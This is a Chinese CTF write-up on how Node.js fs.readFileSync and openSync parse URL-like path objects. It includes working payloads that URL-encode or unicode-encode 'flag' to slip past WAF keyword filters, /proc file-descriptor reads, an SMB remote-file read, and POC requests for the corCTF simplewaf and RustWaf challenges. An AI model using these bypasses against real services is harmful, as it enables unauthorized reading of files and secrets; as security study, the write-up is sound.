0x00 前言
=======

这个知识点最近出现在`corCTF2022-simplewaf`和`2022祥云杯-RustWaf`,这里就是对`fs.readFileSync`进行了详细的调试和跟踪, 详细跟进去之后发现不管是URL解码绕过关键字还是文件描述符的问题, 实际原因都在`fs.openSync`函数里面, 所以其实相比于说`fs.readFileSync`的利用, 我是更乐意看做是`fs.openSync`的利用

1. URL解码绕过关键字
2. proc下生成文件描述符
3. 远程文件的读取

0x01 了解函数
=========

> 了解一个函数最快的方法是找它的官方文档介绍，以及看它的源码。

看一下Nodejs官方文档对`fs.readFileSync`的介绍

![image-20221031153310734](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-38ff96b7a8ee6df2c422ccb7c27c732f5790d888.png)

可以看到, `fs.readFileSync`函数共支持4种格式的文件路径`path`,

1. `字符串类型`就是我们常用的直接指定文件名的方式了
2. `Buffer类型`是一个`buffer`缓冲区
3. `Int整型`就是读取对应的文件描述符
4. `URL类型`可以指定一个URL对象或者对应格式的数组

关于返回的内容就是一个Buffer对象或者String字符串, 这个就不多说了

函数`readFileSync`的源代码中的很多函数几乎都是见名知意的, 所以这里直接贴一下源代码

```javascript
/**
 * Synchronously reads the entire contents of a file.
 * @param {string | Buffer | URL | number} path
 * @param {{
 *   encoding?: string | null;
 *   flag?: string;
 *   }} [options]
 * @returns {string | Buffer}
 */
function readFileSync(path, options) {
  options = getOptions(options, { flag: 'r' });
  const isUserFd = isFd(path); // File descriptor ownership
  const fd = isUserFd ? path : fs.openSync(path, options.flag, 0o666);

  const stats = tryStatSync(fd, isUserFd);
  const size = isFileType(stats, S_IFREG) ? stats[8] : 0;
  let pos = 0;
  let buffer; // Single buffer with file data
  let buffers; // List for when size is unknown

  if (size === 0) {
    buffers = [];
  } else {
    buffer = tryCreateBuffer(size, fd, isUserFd);
  }

  let bytesRead;

  if (size !== 0) {
    do {
      bytesRead = tryReadSync(fd, isUserFd, buffer, pos, size - pos);
      pos += bytesRead;
    } while (bytesRead !== 0 && pos < size);
  } else {
    do {
      // The kernel lies about many files.
      // Go ahead and try to read some bytes.
      buffer = Buffer.allocUnsafe(8192);
      bytesRead = tryReadSync(fd, isUserFd, buffer, 0, 8192);
      if (bytesRead !== 0) {
        ArrayPrototypePush(buffers, buffer.slice(0, bytesRead));
      }
      pos += bytesRead;
    } while (bytesRead !== 0);
  }

  if (!isUserFd)
    fs.closeSync(fd);

  if (size === 0) {
    // Data was collected into the buffers list.
    buffer = Buffer.concat(buffers, pos);
  } else if (pos < size) {
    buffer = buffer.slice(0, pos);
  }

  if (options.encoding) buffer = buffer.toString(options.encoding);
  return buffer;
}
```

简单说一下几个关键函数步骤以及整个函数的执行过程:

1. 检查传入的`path`是不是一个文件描述符(Int), 如果不是的话则通过`fs.openSync`打开文件获得文件描述符, 然后将文件描述符赋值给`fd`
2. `tryStatSync`获取记录文件的相关属性的`fs.Stats` 对象
3. `isFileType`从Stats检查打开的是不是一个文件,如果是一个文件的话将文件大小赋值给`size`
4. `tryCreateBuffer`创建一个读取文件的缓冲区
5. `tryReadSync`使用`fs.readSync`从文件描述符中读取文件内容
6. 关闭文件描述符
7. 将读取文件内容的buffer返回

0x02 URL数组绕过关键字
===============

这个我们可以尝试调试一下,主要关键的点就是`fs.openSync`函数处理URL类型的过程, 而这个解析过程并不是`fs.readFileSync`特有的逻辑代码, 而是打开文件资源的时候使用的`fs.openSync`的路径解析问题, 更具体的说就是`fs.openSync`的路径解析函数`getValidatedPath`(直接就是第一行获得`path`)的过程出的问题

### **fs.openSync**

```javascript
function openSync(path, flags, mode) {
  path = getValidatedPath(path);
  const flagsNumber = stringToFlags(flags);
  mode = parseFileMode(mode, 'mode', 0o666);

  const ctx = { path };
  const result = binding.open(pathModule.toNamespacedPath(path),
                              flagsNumber, mode,
                              undefined, ctx);
  handleErrorFromBinding(ctx);
  return result;
}
```

在这里下断点

![image-20221031184319694](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-c6e89ac2ce40bbf357a2c2b0e9bbe02c76bf29d4.png)

![image-20221031160025853](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-cc80db301464736e9d9e640fab4a1fa99297fdb9.png)

### **getPathFromURLWin32**

继续跟进`getValidatedPath`函数

```javascript
const getValidatedPath = hideStackFrames((fileURLOrPath, propName = 'path') => {
  const path = toPathIfFileURL(fileURLOrPath);
  validatePath(path, propName);
  return path;
});
```

![image-20221031184601772](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9cf8255c5d263203a306353823ca6825adf36c2b.png)

### **toPathIfFileURL(重点)**

这里就是先检查`fileURLOrPath`对象(就是我们传入的path变量)

1. `fileURLOrPath`不能为空
2. 存在`fileURLOrPath.href`
3. 存在`fileURLOrPath.origin`

如果全部满足就直接返回原`fileURLOrPath`对象,满足条件(这时候会将传入的对象看做是一个URL对象,然后就从URL对象获取文件名)就将`fileURLOrPath`传入`fileURLToPath`函数处理, 然后将处理结果返回

否则直接把原对象返回作为文件路径

![image-20221031184729558](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-cdbe7f4e4366a87ff90d31f620fc9dd8d1d53c90.png)

### **fileURLToPath**

1. 检查`path`是不是一个`String`字符串, 是则通过`path = new URL(path)`处理拿到一个URL对象(不是的话就不会处理了,这里为Object对象所以不执行)
2. 执行刚才的`origin`和`href`检查全部满足就抛出Error
3. 检查`path.protocol`, 协议必须指定为`file:`
4. 检查是否为Windwos, 然后使用对应的路径获取函数得到路径后返回

![image-20221031185052218](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-cdfa7d7833538f943fb6b64395f9edaca626cf71.png)

> Windows与Linux各自获取路径的函数是`getPathFromURLWin32`和`getPathFromURLPosix`是不一样的而且区别稍大, 这个注意一下

### **getPathFromURLPosix**

后面的因为我是在Windwos主机上运行所以这部分就是直接看源码不能调试了

`url`就是我们一开始传入的路径对象

1. `url.hostname`非空直接报错
2. `url.pathname`中不能包含`%2f|%2F`(/)或`%5c|%5C`(\\),如果有的话就抛出Error, 否则使用`decodeURIComponent`解析之后将结果返回作为文件路径(这里的`decodeURIComponent`就是关键点, **`decodeURIComponent`函数对`pathname`进行URL解码**)

![image-20221031190423111](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-cadb73c5d1f546c46587050d1f17f9a9b20564d4.png)

在此之后return的文件路径会直接一路返回, 交回到`getValidatedPath`, 然后执行一个`validatePath`函数检验, 检验函数有如下要求

1. 路径的类型必须为`string`或`Uint8Array`
2. 不管是String还是Uint8Array, 其中都不能含有16进制为`00`的字节(防止00截断??)

之后打开了文件之后`openSync`就将这个资源返回给`fs.readFileSync`, 再之后就是读取文件内容的操作了, 到此这个函数就可以说跟完了

### **之后的一些\\\\远程路径的加载**

结果类型和00检验之后`getValidatedPath`函数将path路径直接返回到`fs.openSync`函数中

> 在拿到最后的文件名后, `fs.openSync`函数又会调用`module:path.path.PlatformPath.toNamespacedPath`对文件路径进行处理, 主要就是以下两种情况
> 
> 1. `\\`开头且第3个字符不是`.`或者`?`, 打开文件的地址就是return `\\\\?\\UNC\\${StringPrototypeSlice(resolvedPath, 2)}`, 其中的`${StringPrototypeSlice(resolvedPath, 2)}`就是原字符串减掉前两个字符
> 2. 第一个字符属于`A-Za-z`, 第二第三个字符分别为`:`和`\`, 打开文件地址为`\\\\?\\${resolvedPath}`,其中的`${resolvedPath}`就是原本的路径
> 
> 上面的两个情况都是用于打开远程文件的,不用管

### Windwos与Linux获取文件名函数的差异

细心的师傅可以发现我的测试demo读取的文件路径并不是`C:\\flag.txt`而是" C:\\falg.txt",区别在于前面多了一个空格, 这是什么原因呢?

之前我们有说过Windows与Linux各自获取路径的函数是`getPathFromURLWin32`和`getPathFromURLPosix`是不一样的, 刚刚已经看了Linux的`getPathFromURLPosix`, 下面我们在看一下Windwos的`getPathFromURLWin32`有什么不一样的:

![image-20221031202057681](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-96ced801d9bc0c7053fb29395f5f06959f0788ca.png)

1. `pathname`不能包含`\`或`/`的URL编码(和之前一样)
2. 将`pathname`的`/`替换为`\`(取标准的Windwos文件路径)
3. 使用`decodeURIComponent`对`pathname`URL解码(和之前一样)
4. `hostname`如果非空就返回`\\\\${domainToUnicode(hostname)}${pathname}`, 其中的`domainToUnicode`会进行unicode解码(有hostname就进行远程文件加载)
5. 1. `pathname`的第二个字符必须是字母`a-zA-Z`;
    2. `pathname`第3个字符必须是`:`, 任何一个条件不满足抛出Error`must be absolute`
6. 丢弃第一个字母返回作为文件路径(感觉这点是比较有意思的)

所以主要区别有三点:

1. 支持`hostname`非空任何进行远程加载
2. 必须是绝对路径
3. 传入路径第一个字符被丢弃(可以看到下面读取`xC:/flag.txt`成功了)

![image-20221031203805986](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-e7b0ed3ba8f3cf65b304382a39ae971a998fb277.png)

构造payload
---------

可以知道要满足`fs.readFileSync`的数组格式读取需要满足以下条件

1. 有`href`且非空
2. 有`origin`且非空
3. `protocol` 等于`file:`
4. 有`hostname`且等于空(Windwos下非空的话会进行远程加载)
5. 有`pathname`且非空(读取的文件路径)

利用点在于`pathname`会被URL解析一次, 所以可以使用URL编码绕过关键字检测(但是不能包含有`\/`的URL编码)

`flag => %66%6c%61%67`

![image-20221031205901241](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-646156fb5b732a373ada0eeb0e561170c733dbd9.png)

0x03 文件描述符读取
============

这个没什么好说的, 上面的内容几乎就是`fs.open`的调试跟踪了, 直接记一下文件打开之后会在proc下面产生文件描述符就行, 实际的利用对于一个CTFer而言的话肯定就不陌生了(条件竞争)所以这里不多说

![image-20221031160022329](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-cd30befda4734f243a2da8fd9814accf41a7987d.png)

(另外直接传入一个Int的话就是读取对应的描述符资源了)

**验证demo**

```javascript
const fs = require("fs")

while(1){
    console.log("Start---");
    console.log(fs.readdirSync("/proc/self/fd"));
    console.log(fs.readFileSync("/proc/self/status").toString());
}
```

```bash
nodejs 1.js > 1

cat ./1 |grep pid   #忘了pid是记录在哪个文件了所以通过status文件的输出结果找pid,有点呆
ls -al /proc/<pid>/fd
```

![image-20221031215413637](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-e9978f62cd922b0653d1c819d654dea799f5485d.png)

![image-20221031215442561](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-283262cb0a55df322eeba1310448deb6f515492f.png)

可以看到输出结果的文件描述符被重定向到了`Desktop/1`,

同时多ls几次就可以看到打开文件目录`/proc/self/fd`和`/proc/self/status`分别对应的文件描述符

0x04 读取远程文件
===========

平时我们如果使用``fs.readFileSync`读取文件的时候如果使用远程地址`http://|https://|ftp://`这些都会失败并且在上面看到了`protocol`必须等于`file:`, 这时候是不是觉得这样子的话就没办法读取远程文件了?

实际上还是可以访问远程文件的, 这个在调试源码的时候看到多处`\\`的检测和逻辑处理的时候就可以自然想到SMB服务了, 所以我们可以直接加载SMB服务的远程文件, 只不过多了一些条件限制

1. `Windwos`下通过`URL数组`格式或`String`格式直接读取均可
2. `Linux`本地尝试未成功

**开启SMB服务**

先在Linux虚拟机跑[smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)(做过内网横向的师傅对这个肯定不陌生了)把一个目录映射作为不需要身份验证的SMB服务(Linux IP:: 192.168.92.1)

```bash
python3 smbserver.py evilsmb `pwd` -smb2support    
```

Windows成功读取SMB文件
----------------

Windwos本地的测试demo:

```javascript
const fs = require("fs");

var file = '{' +
    '\t"protocol":"file:",' +
    '\t"href":"1",' +
    '\t"origin":"1",' +
    '\t"pathname":"/evilsmb/flag",' +
    '\t"hostname":"192.168.92.128"' +
    '\t}';
console.log("String Test::",fs.readFileSync("\\\\192.168.92.128/evilsmb/flag").toString())
console.log("URL Test::",fs.readFileSync(JSON.parse(file)).toString())

```

![image-20221031223832400](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-dfa3e273d21c8b5feb4b1529a70b671079cf2135.png)

然后Windwos本地运行demo可以看到两种方式都直接读取到了flag测试文件

![image-20221031223223341](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8bb1dbbfaea72e103fb601fb9ecd9fd0588b2543.png)

这里的`String`指定就不多说了，

`URI` 类型读取的文件路径为`\\\\${domainToUnicode(hostname)}${pathname}`, 其中的`hostname`和`pathname`分别就是json对象中的同名参数, Windwos中只要定义了hostname都会通过这种拼接方式获取文件读取路径

**Linux的差异**
------------

然而之前在**`Windwos与Linux获取文件名函数的差异`**部分就有讲过它们之间的差异, Linux中的URL对象是不允许定义`hostname`的,否则直接就抛出Error了, 而另外我们通过`String`类型参数直接指定SMB文件路径也还是失败了

```javascript
const fs = require("fs");  

var file = '{' +  
    '\\t"protocol":"file:",' +  
    '\\t"href":"1",' +  
    '\\t"origin":"1",' +  
    '\\t"pathname":"/evilsmb/flag",' +  
    '\\t"hostname":"192.168.92.128"' +  
    '\\t}';  
try {  
    console.log("URL Test::",fs.readFileSync(JSON.parse(file)).toString())  
}catch (e) {  
    console.log("URL Test::ERROR")  
    console.log(e)  
}  

try {  
    console.log("String Test::",fs.readFileSync("//192.168.92.128/evilsmb/flag").toString())  
}catch (e) {  
    console.log("String1 Test::ERROR")  
    console.log(e)  
}  

try {  
    console.log("String Test::",fs.readFileSync("\\\\\\\\192.168.92.128\\\\evilsmb\\\\flag").toString())  
}catch (e) {  
    console.log("String2 Test::ERROR")  
    console.log(e)  
}

```

这里绝对路径都不行, 因为对Linux的SMB服务个人并不场使用所以并没有很熟悉, 这里这里不知道是不是在当前默认不支持访问SMB, 然后我便执行`sudo apt install smbclient`安装了smbclient看到执行`smbclient //192.168.92.128/evilsmb`是可以正常进入SMB服务的

原因首先可以排除身份验证问题, 因为我当前的SMB服务是不需要身份验证的, 并且在整个执行过程中SMB服务并没有收到任何的连接请求记录, 所以就是Nodejs从没向SMB服务发出请求, 具体的原因师傅们可以自行探索一下(懒狗写这个已经花了很多时间了, 不想再继续找了...)

![image-20221031225315701](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-58cf50c87c18141d31bbfd19b11ddcfa7a558cb2.png)

然后看报错的话就是显示URL对象的hostname必须为空或者`localhost`(我们看源码实际上是只能为空), 然后我便将hostname改成了localhost, 然后到运行SMB服务的kali执行js文件还是失败了

![image-20221031234820714](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-57a76150a8d6dbb7dd7b295e1594810a404210d7.png)

0x05 例题demo
===========

### corCTF2022-simplewaf

```bash
const express = require("express");
const fs = require("fs");

const app = express();

const PORT = process.env.PORT || 3456;

app.use((req, res, next) => {
    if([req.body, req.headers, req.query].some(
        (item) => item && JSON.stringify(item).includes("flag")//ban 掉了 flag
    )) {
        return res.send("bad hacker!");
    }
    next();
});

app.get("/", (req, res) => {
    try {
        res.setHeader("Content-Type", "text/html");
        res.send(fs.readFileSync(req.query.file || "index.html").toString());       
    }
    catch(err) {
        console.log(err);
    }
});

app.listen(PORT, () => console.log(`web/simplewaf listening on ${PORT}`));
```

POC:

```http
?file[href]=a&file[origin]=1&file[protocol]=file:&file[hostname]=&file[pathname]=/app/%66%6c%61%67.txt
```

### 2022祥云杯-rustWaf

app.js

```javascript

const express = require('express');
const app = express();
const bodyParser = require("body-parser")
const fs = require("fs")
app.use(bodyParser.text({type: '*/*'}));
const {  execFileSync } = require('child_process');

app.post('/readfile', function (req, res) {
    console.log(req.body)
    let body = req.body.toString();

    let file_to_read = "app.js";
    const file = execFileSync('./rust-waf', [body], {
        encoding: 'utf-8'
    }).trim();
    console.log(file)
    try {
        file_to_read = JSON.parse(file)
    } catch (e){
        file_to_read = file
    }
    let data = fs.readFileSync(file_to_read);
    res.send(data.toString());
});

app.get('/', function (req, res) {
    res.send('see `/src`');
});

app.get('/src', function (req, res) {
    var data = fs.readFileSync('app.js');
    res.send(data.toString());
});

app.listen(3000, function () {
    console.log('start listening on port 3000');
    console.log("http://127.0.0.1:3000")
});

```

rust-waf的源码main.rs

```rust
use std::env;
use serde::{Deserialize, Serialize};
use serde_json::Value;

static BLACK_PROPERTY: &str = "protocol";

#[derive(Debug, Serialize, Deserialize)]
struct File{
    #[serde(default = "default_protocol")]
    pub protocol: String,
    pub href: String,
    pub origin: String,
    pub pathname: String,
    pub hostname:String
}

pub fn default_protocol() -> String {
    "http".to_string()
}
//protocol is default value,can't be customized
pub fn waf(body: &str) -> String {
    if body.to_lowercase().contains("flag") ||  body.to_lowercase().contains("proc"){
        return String::from("./main.rs");
    }
    if let Ok(json_body) = serde_json::from_str::<Value>(body) {
        if let Some(json_body_obj) = json_body.as_object() {
            if json_body_obj.keys().any(|key| key == BLACK_PROPERTY) {
                return String::from("./main.rs");
            }
        }
        //not contains protocol,check if struct is File
        if let Ok(file) = serde_json::from_str::<File>(body) {
            return serde_json::to_string(&file).unwrap_or(String::from("./main.rs"));
        }
    } else{
        //body not json
        return String::from(body);
    }
    return String::from("./main.rs");
}

fn main() {
    let args: Vec<String> = env::args().collect();
    println!("{}", waf(&args[1]));
}
```

上面的`corCTF2022-simplewaf`还可以直接传数组, 而这里就直接是对字符串检测, 但是原理还是一样的

POC1:

rust不支持解析UTF-16字符集所以使用UTF-16中的有一个unicode编码`\uD800`可以让rust解析出错直接返回原数据, 而nodejs正常解析UTF-16不会报错

```http
{
    "protocol":"file:",
    "\uD800":"",
    "href":"1",
    "origin":"1",
    "pathname":"/%66%6c%61%67",
    "hostname":""
}
```

POC2:

这里的原理是直接按照rust中的`File`结构体顺序可以进行一一对应赋值

```http
[
    "file:",
    "1",
    "1",
    "/%66%6c%61%67",
    ""
]
```

除此之外想到json解码的时候会进行Unicode解码, 所以如果单纯是想要绕过`flag`关键字的话应该还有一种方法就是二次unicode, 第一次的unicode被传入rust进行解析, 解析后的Unicode会被返回到app.js, 然后app.js进行json解析的时候再进行一次Unicode解析, 所以应该说还有POC3和POC4

POC3:

```http
{
    "protocol":"file:",
    "\uD800":"",
    "href":"1",
    "origin":"1",
    "pathname":"/\u0066\u006c\u0061\u0067",
    "hostname":""
}
```

POC4:

```http
[
    "file:",
    "1",
    "1",
    "/\u0066\u006c\u0061\u0067",
    ""
]
```

这是本地运行祥云杯的程序之后的截图, paylaod可能看起来比较奇怪, 但是如果仔细看了前面的整篇文章的话相信对这个payload的构造没有什么疑惑的

![image-20221031220003626](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-5cf334c2dcaf002277fd3b19f3c2340257ab4ff9.png)